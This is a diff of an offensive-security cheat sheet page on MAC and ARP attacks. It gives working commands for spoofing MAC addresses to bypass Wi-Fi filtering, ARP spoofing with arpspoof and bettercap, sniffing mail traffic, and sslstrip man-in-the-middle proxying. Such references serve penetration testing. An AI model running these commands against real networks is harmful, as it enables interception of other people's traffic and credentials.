@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2022-09-11T16:52:52 CEST">
+<meta name="revised" content="2023-02-14T12:07:00 CET">
 <title>MAC &amp; ARP :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -27,7 +27,36 @@
     
       <header>
   <div class="logo">
-    <a class="baselink" href="/">Offensive Security Cheatsheet</a>
+    <head>
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+</head>
+<a class="baselink" href="/">Offensive Security Cheatsheet</a>
+
   </div>
   <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
     <nav class="shortcuts">
@@ -1156,6 +1185,69 @@
       <a href="/windows-systems/exploitation/">Exploitation</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
+      <li data-nav-id="/windows-systems/exploitation/exploitation_tricks/" class="dd-item">
+        <div>
+          <a href="/windows-systems/exploitation/exploitation_tricks/">
+            Exploitation Tricks
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/windows-systems/exploitation/remote_execution_techniques/" class="dd-item">
+        <div>
+          <a href="/windows-systems/exploitation/remote_execution_techniques/">
+            Remote Execution Techniques
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/windows-systems/exploitation/crackmapexec/" class="dd-item">
+        <div>
+          <a href="/windows-systems/exploitation/crackmapexec/">
+            CrackMapExec
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/windows-systems/exploitation/impacket/" class="dd-item">
+        <div>
+          <a href="/windows-systems/exploitation/impacket/">
+            Impacket
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/windows-systems/exploitation/kerberos/" class="dd-item">
+        <div>
+          <a href="/windows-systems/exploitation/kerberos/">
+            Kerberos
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/windows-systems/exploitation/rdp_exploitation/" class="dd-item">
+        <div>
+          <a href="/windows-systems/exploitation/rdp_exploitation/">
+            RDP Exploitation
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/windows-systems/exploitation/file_transfer/" class="dd-item">
+        <div>
+          <a href="/windows-systems/exploitation/file_transfer/">
+            File Transfer
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/windows-systems/exploitation/iis/" class="dd-item">
+        <div>
+          <a href="/windows-systems/exploitation/iis/">
+            IIS
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/windows-systems/exploitation/ipv6/" class="dd-item">
+        <div>
+          <a href="/windows-systems/exploitation/ipv6/">
+            IPv6
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
         </ul>
     </li>
     <li data-nav-id="/windows-systems/privilege-escalation/" class="dd-item haschildren
@@ -1750,21 +1842,17 @@
     
     
     
-    
-
-<h3 id="mac-filtering">MAC Filtering</h3>
-
+    <h3 id="mac-filtering">MAC Filtering</h3>
 <h5 id="ethernet">Ethernet</h5>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo macchanger -a eth0</code></pre></div>
-<h5 id="wifi">WiFi</h5>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo macchanger -a eth0
+</code></pre></div><h5 id="wifi">WiFi</h5>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo airmon-ng start wlan0
 $ airodump-ng –c <span style="color:#f92672">[</span>channel<span style="color:#f92672">]</span>–bssid <span style="color:#f92672">[</span>target router MAC Address<span style="color:#f92672">]</span>–i wlan0mon  <span style="color:#75715e"># Trouver des MAC whitelisted</span>
 sudo airmon-ng stop wlan0mon
 sudo ifconfig wlan0 down
 sudo macchanger -m <span style="color:#f92672">[</span>New MAC Address<span style="color:#f92672">]</span> wlan0
-sudo ifconfig wlan0 up</code></pre></div>
-<p><br/></p>
-
+sudo ifconfig wlan0 up
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="arp-spoofing">ARP Spoofing</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Old technique but still usable sometimes</span>
 <span style="color:#75715e"># You can spoof ARP trafic in order to discover new machines</span>
@@ -1782,9 +1870,8 @@ scp &lt;path&gt; user@ip:/tmp
 arpspoof -i eth1 -t &lt;victim&gt; &lt;impersonated machine&gt;
  
 <span style="color:#75715e"># Terminal 2</span>
-tcpdump -i eth1 -A tcp port <span style="color:#ae81ff">143</span> or port <span style="color:#ae81ff">25</span></code></pre></div>
-<p><br/></p>
-
+tcpdump -i eth1 -A tcp port <span style="color:#ae81ff">143</span> or port <span style="color:#ae81ff">25</span>
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="arp-spoofing-using-bettercap">ARP Spoofing using Bettercap</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Activate router mode on attacker machine</span>
 <span style="color:#111">echo</span> <span style="color:#ae81ff">1</span> &gt; /proc/sys/net/ipv4/ip_forward
@@ -1793,18 +1880,19 @@ tcpdump -i eth1 -A tcp port <span style="color:#ae81ff">143</span> or port <span
 &gt; net.show
 
 <span style="color:#75715e"># Set target for ARP spoofing</span>
-&gt; <span style="color:#111">set</span> arp.spoof.targets <span style="color:#ae81ff">192</span>.168.5.99
+&gt; <span style="color:#111">set</span> arp.spoof.targets 192.168.5.99
 
 <span style="color:#75715e"># Launch attack</span>
-&gt; arp.spoof on</code></pre></div>
-<h3 id="proxy-mitm-using-bettercap">Proxy MiTM using Bettercap</h3>
+&gt; arp.spoof on
+</code></pre></div><h3 id="proxy-mitm-using-bettercap">Proxy MiTM using Bettercap</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Configure sniffer verbosity</span>
 &gt; <span style="color:#111">set</span> net.sniff.verbose <span style="color:#111">false</span>
 &gt; net.sniff on
 
 <span style="color:#75715e"># Then set the SSL proxy (It will create an autogenerated SSL cert)</span>
 &gt; <span style="color:#111">set</span> http.proxy.sslstrip <span style="color:#111">true</span>
-&gt; http.proxy on</code></pre></div>
+&gt; http.proxy on
+</code></pre></div>
 
     
     
